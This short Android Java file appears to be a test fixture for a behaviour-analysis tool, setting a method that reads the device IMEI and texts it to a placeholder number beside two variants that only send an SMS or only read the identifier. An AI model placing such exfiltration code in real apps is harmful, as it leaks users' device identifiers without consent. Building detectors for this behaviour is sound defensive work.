package behaviour;

import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class Behaviour extends android.app.Activity {
    // reads the device identifier and sends it by SMS in one method
    void exfiltrate(Context c) {
        TelephonyManager t = (TelephonyManager) c.getSystemService("phone");
        String imei = t.getDeviceId();
        SmsManager.getDefault().sendTextMessage("+15550100", null, imei, null, null);
    }
    // sends an SMS without reading any device identifier
    void spam() {
        SmsManager.getDefault().sendTextMessage("+15550100", null, "hi", null, null);
    }
    // reads the device identifier and sends nothing
    String identify(Context c) {
        TelephonyManager t = (TelephonyManager) c.getSystemService("phone");
        return t.getDeviceId();
    }
}
